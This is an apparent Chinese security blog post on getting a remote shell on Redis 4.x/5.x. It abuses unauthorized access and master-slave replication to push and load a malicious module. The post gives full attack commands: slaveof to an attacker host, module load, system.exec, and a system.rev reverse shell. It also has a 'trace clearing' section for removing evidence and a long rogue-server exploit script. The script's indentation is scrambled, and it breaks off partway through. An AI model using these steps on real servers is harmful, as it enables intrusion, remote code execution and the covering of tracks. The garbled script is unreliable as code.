<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redis主从复制getshell | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Redis主从复制getshell</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-11-25T07:47:00.244Z" id="date"> 2023-11-25</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-11-25T18:43:50.013Z" id="updated"> 2023-11-26</time></div></span><br><span>文章总字数: <div class="control">2.7k</div></span><br><span>预计阅读时间: <div class="control">12 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 利用方式</h1>
<p>Redis未授权漏洞常见的漏洞利用方式：</p>
<ul>
<li>Windows下，绝对路径写webshell 、写入启动项。</li>
<li>Linux下，绝对路径写webshell 、公私钥认证获取root权限 、利用contrab计划任务反弹shell。</li>
</ul>
<p>基于Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），这就使得它可以轻易实现以上任何一种漏洞利用方式，而且存在着更多的可能性，等待被探索。</p>
<p>1、生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand<br>cd RedisModules-ExecuteCommand/<br>make<br></code></pre></td></tr></table></figure>
<p>2、攻击端执行： python <a target="_blank" rel="noopener" href="http://redis-rce.py">redis-rce.py</a> -r 目标ip-p 目标端口 -L 本地ip -f <a target="_blank" rel="noopener" href="http://xn--5bu4m.so">恶意.so</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">git clone https://github.com/Ridter/redis-rce.git<br>cd redis-rce/<br>cp ../RedisModules-ExecuteCommand/src/module.so ./<br>pip install -r requirements.txt <br>python redis-rce.py -r 192.168.17.134 -p 6379 -L 192.168.17.137 -f module.so<br></code></pre></td></tr></table></figure>
<p>这里用上面介绍的方法不知为何复现不了，估计是不存在漏洞的缘故吧。。。下面采用直接将恶意文件放入docker容器中的办法。</p>
<p>3、搭建环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">docker run -p 6300:6379 -d redis:5.0 redis-server<br></code></pre></td></tr></table></figure>
<p>复制恶意so到容器中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">docker cp /home/hybcx/Desktop/redis-rogue-server/exp.so 8267936c7500:/data/exp.so<br></code></pre></td></tr></table></figure>
<p>加载恶意模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">127.0.0.1:6379&gt; module load /data/exp.so<br>OK<br>127.0.0.1:6379&gt; system.exec &quot;whoami&quot;<br>&quot;redis\n&quot;<br></code></pre></td></tr></table></figure>
<p>这里我又采用上述步骤3，之后module又卡住我了，安装了半天就是安装不上去，所以就看个思路吧，真的放弃了。。。</p>
<p>但想了想还是在搞一下，结果发现是自己根本就没进去redis服务。。。。。</p>
<p>这里也是尝试了一下redis 5.0版本与redis最新版本，发现只能在5.0上才可以成功了用，如下图所示：</p>
<p class='item-img' data-src='image-20231125204552647.png'><img src="image-20231125204552647.png" alt="image-20231125204552647"></p>
<p>看了文章说道，这种漏洞只能在redis4.x/5.x版本下才能利用到。</p>
<p>这里对于redis服务的搭建可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jacson__/article/details/124399997">docker启动redis简单方法</a></p>
<p>那么在真实环境中，我们如何将恶意so文件传输到服务器中呢？这里就需要用到Redis的主从复制了。</p>
<h1>0x02 主从复制原理</h1>
<p>这里先了解一波相关知识：</p>
<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>
<p>Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。</p>
<p>当slave向master发送<code>PSYNC</code>命令之后，一般会得到三种回复：</p>
<blockquote>
<ol>
<li>+FULLRESYNC：进行全量复制。</li>
<li>+CONTINUE：进行增量同步。</li>
<li>-ERR：当前master还不支持PSYNC。</li>
</ol>
</blockquote>
<p>进行全量复制时，会将master上的<code>RDB</code>文件同步到slave上。</p>
<p>而进行增量复制时，slave向master要求数据同步，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是<strong>不会传输RDB文件</strong>。</p>
<p>为了能让恶意so传输到目标服务器上，这里则必须采用全量复制。</p>
<p>在进行全量复制之前，如果从服务器存在和主服务一样的变量，则其值会被覆盖，同时，如果存在主服务器不存在的变量，则会被删除。</p>
<p>这里懒得配置主从服务器了，直接照搬了。。。。</p>
<p class='item-img' data-src='image-20231125210459574.png'><img src="image-20231125210459574.png" alt="image-20231125210459574"></p>
<p>或者</p>
<p>首先，我们通过一个简单的测试，来熟悉一下slave和master的握手协议过程：</p>
<p>1、监听本地1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abap">nc -lvvp 1234<br></code></pre></td></tr></table></figure>
<p>2、将Redis服务器设置为从节点(slave)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abap">slaveof 127.0.0.1 1234<br></code></pre></td></tr></table></figure>
<p>3、使用nc模拟Redis主服务器，进行模拟Redis主从交互过程（红色部分为slave发送的命令）：</p>
<p>但这里我依旧复现不出来，不知道什么原因。。。。。。。。。</p>
<p class='item-img' data-src='image-20231125210537723.png'><img src="image-20231125210537723.png" alt="image-20231125210537723"></p>
<p>以上，通过nc进行模拟Redis主从复制的交互过程，同理，如果构建模拟一个Redis服务器，利用Redis主从复制的机制，那么就可以通过FULLRESYNC将任意文件同步到从节点。</p>
<p>攻击过程中相关命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abap">#设置redis的备份路径为当前目录<br>config set dir ./<br>#设置备份文件名为exp.so，默认为dump.rdb<br>config set dbfilename exp.so<br>#设置主服务器IP和端口<br>slaveof 192.168.172.129 1234  <br>#加载恶意模块<br>module load ./exp.so<br>#执行系统命令<br>system.exec &#x27;whoami&#x27;<br>system.rev 127.0.0.1 9999    <br></code></pre></td></tr></table></figure>
<h1>0x03 Redis主从复制手动挡</h1>
<p>手动操作过程记录：</p>
<p>1、编写脚本，构造恶意Redis服务器，监听本地端口1234，<a target="_blank" rel="noopener" href="http://xn--exp-0w2ej69y.so">加载exp.so</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abap">python RogueServer.py --lport 1234 --exp exp.so<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231125210957121.png'><img src="image-20231125210957121.png" alt="image-20231125210957121"></p>
<p>2、通过未授权访问连入要攻击的redis服务器。</p>
<p>执行相关命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abap">#设置redis的备份路径为当前目录<br>    config set dir ./<br>#设置备份文件名为exp.so，默认为dump.rdb<br>    config set dbfilename exp.so<br>#设置主服务器IP和端口<br>    slaveof 192.168.172.129 1234  <br>#加载恶意模块<br>    module load ./exp.so<br>#切断主从，关闭复制功能<br>    slaveof no one <br>#执行系统命令<br>    system.exec &#x27;whoami&#x27;<br>    system.rev 127.0.0.1 9999    <br></code></pre></td></tr></table></figure>
<p>成功执行系统命令：</p>
<p class='item-img' data-src='image-20231125211500379.png'><img src="image-20231125211500379.png" alt="image-20231125211500379"></p>
<h1>0x04 痕迹清除</h1>
<p>为了减少对服务器的影响，攻击完成后，应该尽量清除痕迹，需要恢复目录和数据库文件，卸载同时删除模块，而数据原本的配置信息，需要在攻击之前进行备份。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abap">CONFIG get *    # 获取所有的配置<br>CONFIG get dir   # 获取 快照文件 保存的 位置<br>CONFIG get dbfilename   # 获取 快照文件 的文件名<br><br>#切断主从，关闭复制功能<br>slaveof no one <br>#恢复目录<br>config set dir /data<br>#通过dump.rdb文件恢复数据<br>config set dbfilename dump.rdb<br>#删除exp.so<br>system.exec &#x27;rm ./exp.so&#x27;<br>#卸载system模块的加载<br>module unload system<br></code></pre></td></tr></table></figure>
<p>漏洞利用的版本是redis 4.x/5.x ，如果是先前版本的Redis，则无法加载模块，自然也就无法利用。在网上开了几个开源的利用脚本，都没有进行版本的判断，如果直接使用exp，除了攻击失败外，可能会修改了 dir 和dbfilename ，这些都可以通过redis未授权修改回原来的配置（前提是有提前备份），而目录下会多生成一个 exp.so文件。</p>
<h1>0x05 利用脚本</h1>
<p>这里的脚本是大佬在 <a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell%E7%9A%84%E5%9F%BA%E7%A1%80%E4%B8%8A%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%E7%9A%84%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%A2%9E%E5%8A%A0%E4%BA%86%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%AF%AF%E6%89%93%E5%85%B6%E4%BB%96%E7%89%88%E6%9C%AC%E7%9A%84Redis%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E6%AD%A4%E5%A4%96%EF%BC%8C%E8%BF%98%E5%A2%9E%E5%8A%A0%E4%BA%86%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%BD%93%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4%E6%97%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%9B%AE%E6%A0%87Redis%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9A%84dir%E3%80%81dbfilename%E3%80%81%E4%B8%BB%E4%BB%8E%E5%85%B3%E7%B3%BB%E7%AD%89%E4%B8%8D%E6%98%AF%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E4%BF%AE%E6%94%B9%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82">https://github.com/vulhub/redis-rogue-getshell的基础上进行修改的，主要增加了版本检测，防止误打其他版本的Redis服务器。此外，还增加了配置信息备份，当痕迹清除时，如果目标Redis服务器的的dir、dbfilename、主从关系等不是默认配置时，需要手动修改脚本中的参数。</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><br>logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;&gt;&gt; %(message)s&#x27;</span>)<br>DELIMITER = <span class="hljs-string">b&quot;\r\n&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):<br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, data</span>):<br>		<span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&#x27;*&#x27;</span>):<br>			<span class="hljs-keyword">return</span> data.strip().split(DELIMITER)[<span class="hljs-number">2</span>::<span class="hljs-number">2</span>]<br>		<span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&#x27;$&#x27;</span>):<br>			<span class="hljs-keyword">return</span> data.split(DELIMITER, <span class="hljs-number">2</span>)[<span class="hljs-number">1</span>]<br><br>		<span class="hljs-keyword">return</span> data.strip().split()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>		data = self.request.recv(<span class="hljs-number">1024</span>)<br>		logging.info(<span class="hljs-string">&quot;receive data: %r&quot;</span>, data)<br>		arr = self.decode(data)<br>	<span class="hljs-keyword">if</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b&#x27;PING&#x27;</span>):<br>		self.request.sendall(<span class="hljs-string">b&#x27;+PONG&#x27;</span> + DELIMITER)<br>	<span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b&#x27;REPLCONF&#x27;</span>):<br>		self.request.sendall(<span class="hljs-string">b&#x27;+OK&#x27;</span> + DELIMITER)<br>	<span class="hljs-keyword">elif</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b&#x27;PSYNC&#x27;</span>) <span class="hljs-keyword">or</span> arr[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">b&#x27;SYNC&#x27;</span>):<br>		self.request.sendall(<span class="hljs-string">b&#x27;+FULLRESYNC &#x27;</span> + <span class="hljs-string">b&#x27;Z&#x27;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">b&#x27; 1&#x27;</span> + DELIMITER)<br>		self.request.sendall(<span class="hljs-string">b&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(self.server.payload)).encode() + DELIMITER)<br>		self.request.sendall(self.server.payload + DELIMITER)<br>	<span class="hljs-keyword">break</span><br><br>self.finish()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>(<span class="hljs-params">self</span>):<br>	self.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoServer</span>(socketserver.TCPServer):<br>	allow_reuse_address = <span class="hljs-literal">True</span><br><br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, server_address, payload</span>):<br>		<span class="hljs-built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="hljs-literal">True</span>)<br>		self.payload = payload<br><br><br>	<span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisClient</span>(<span class="hljs-title class_ inherited__">object</span>):<br>		<span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, rhost, rport</span>):<br>			self.client = socket.create_connection((rhost, rport), timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, data</span>):<br>	data = self.encode(data)<br>	self.client.send(data)<br>	logging.info(<span class="hljs-string">&quot;send data: %r&quot;</span>, data)<br>	<span class="hljs-keyword">return</span> self.recv()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, count=<span class="hljs-number">65535</span></span>):<br>	data = self.client.recv(count)<br>	logging.info(<span class="hljs-string">&quot;receive data: %r&quot;</span>, data)<br>	<span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">self, data</span>):<br>	<span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):<br>		data = data.split()<br><br>args = [<span class="hljs-string">b&#x27;*&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode()]<br><span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> data:<br>	args.extend([DELIMITER, <span class="hljs-string">b&#x27;$&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arg)).encode(), DELIMITER, arg])<br>	args.append(DELIMITER)<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(args)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_command_line</span>(<span class="hljs-params">data</span>):<br>	<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;$&#x27;</span>):<br>		<span class="hljs-keyword">return</span> data.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>	offset = data.find(DELIMITER)<br>	size = <span class="hljs-built_in">int</span>(data[<span class="hljs-number">1</span>:offset])<br>	offset += <span class="hljs-built_in">len</span>(DELIMITER)<br>	data = data[offset:offset+size]<br>	<span class="hljs-keyword">return</span> data.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">rhost, rport, lhost, lport, expfile, command, auth</span>):<br>	<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(expfile, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>		server = RoguoServer((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, lport), f.read())<br><br>		client = RedisClient(rhost, rport)<br><br>		lhost = lhost.encode()<br>		lport = <span class="hljs-built_in">str</span>(lport).encode()<br>		command = command.encode()<br><br>		<span class="hljs-keyword">if</span> auth:<br>			client.send([<span class="hljs-string">b&#x27;AUTH&#x27;</span>, auth.encode()])<br><br>		authTest = client.send([<span class="hljs-string">b&#x27;info&#x27;</span>])<br><br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;NOAUTH&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(authTest, encoding = <span class="hljs-string">&quot;utf8&quot;</span>):<br>			<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[-] Authentication required.Use: -a Redis_Password&quot;</span><br><br><br><span class="hljs-comment"># Backup the configuration information</span><br>conf = client.send([<span class="hljs-string">b&#x27;CONFIG&#x27;</span>,<span class="hljs-string">b&#x27;get&#x27;</span>,<span class="hljs-string">b&#x27;*&#x27;</span>])<br>conf = <span class="hljs-built_in">str</span>(conf, encoding = <span class="hljs-string">&quot;utf8&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;conf.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>	file.write(conf)<br><br><span class="hljs-comment"># Version detecting</span><br>info = client.send([<span class="hljs-string">b&#x27;info&#x27;</span>])<br>info = <span class="hljs-built_in">str</span>(info, encoding = <span class="hljs-string">&quot;utf8&quot;</span>)<br>res = re.search(<span class="hljs-string">r&#x27;.*redis_version:(\d+)\..*&#x27;</span>,info)<br><span class="hljs-keyword">if</span> res.groups():<br>	version = res.groups()[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> version != <span class="hljs-string">&#x27;4&#x27;</span> <span class="hljs-keyword">and</span> version != <span class="hljs-string">&#x27;5&#x27;</span>:<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[-] Version Error.only exists in version 4.x/5.x&quot;</span><br><br><br><br>client.send([<span class="hljs-string">b&#x27;SLAVEOF&#x27;</span>, lhost, lport])<br>client.send([<span class="hljs-string">b&#x27;CONFIG&#x27;</span>, <span class="hljs-string">b&#x27;SET&#x27;</span>, <span class="hljs-string">b&#x27;dbfilename&#x27;</span>, <span class="hljs-string">b&#x27;exp.so&#x27;</span>])<br>time.sleep(<span class="hljs-number">2</span>)<br><br>server.handle_request()<br>time.sleep(<span class="hljs-number">2</span>)<br><br><br>client.send([<span class="hljs-string">b&#x27;MODULE&#x27;</span>, <span class="hljs-string">b&#x27;LOAD&#x27;</span>, <span class="hljs-string">b&#x27;./exp.so&#x27;</span>])<br><br>client.send([<span class="hljs-string">b&#x27;SLAVEOF&#x27;</span>, <span class="hljs-string">b&#x27;NO&#x27;</span>, <span class="hljs-string">b&#x27;ONE&#x27;</span>])<br>client.send([<span class="hljs-string">b&#x27;CONFIG&#x27;</span>, <span class="hljs-string">b&#x27;SET&#x27;</span>, <span class="hljs-string">b&#x27;dbfilename&#x27;</span>, <span class="hljs-string">b&#x27;dump.rdb&#x27;</span>])<br>resp = client.send([<span class="hljs-string">b&#x27;system.exec&#x27;</span>, command])<br>client.send([<span class="hljs-string">b&#x27;MODULE&#x27;</span>, <span class="hljs-string">b&#x27;UNLOAD&#x27;</span>, <span class="hljs-string">b&#x27;system&#x27;</span>])<br><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+]RCE Successfully! Result: &quot;</span> + decode_command_line(resp)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Redis 4.x/5.x RCE with RedisModules&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-r&quot;</span>, <span class="hljs-string">&quot;--rhost&quot;</span>, dest=<span class="hljs-string">&quot;rhost&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;target host&quot;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--rport&quot;</span>, dest=<span class="hljs-string">&quot;rport&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>,<br>    <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;target redis port, default 6379&quot;</span>, default=<span class="hljs-number">6379</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;--lhost&quot;</span>, dest=<span class="hljs-string">&quot;lhost&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<br>    <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;rogue server ip&quot;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-P&quot;</span>, <span class="hljs-string">&quot;--lport&quot;</span>, dest=<span 